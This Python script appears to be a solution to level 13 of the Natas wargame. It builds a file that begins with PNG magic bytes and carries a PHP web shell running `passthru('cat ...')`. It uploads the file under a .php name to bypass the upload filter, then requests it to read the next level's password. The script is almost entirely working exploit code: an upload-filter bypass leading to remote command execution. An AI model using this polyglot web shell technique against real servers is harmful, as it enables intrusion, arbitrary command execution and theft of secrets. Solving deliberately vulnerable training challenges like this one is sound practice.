import re
import Auther
import os
# https://www.garykessler.net/library/file_sigs_GCK_latest.html
PNG = bytes.fromhex("89 50 4E 47 0D 0A 1A 0A".replace(" ", ""))
# Write bytes require binary writing mode
with open("natas13_upload.png", "wb") as f:
    f.write(PNG)
    f.write(
        f'<?php print passthru("cat {Auther.authPathOnServer(14)}"); ?>'.encode())


def findFileName(text: str):
    pattern = re.compile('<a href="(.*)">.*has been uploaded')
    return next((m[1] for line in text.splitlines() if (m := pattern.search(line))), None)


# And binary reading mode
with open("natas13_upload.png", "rb") as f:
    response = Auther.request(13, data={
        "filename": "FOO.php"
    }, files={
        "uploadedfile": f
    }).text
    if name := findFileName(response):
        Auther.passwordLineGetter(Auther.request(13, name, "GET").text, 14)()
os.remove("natas13_upload.png")
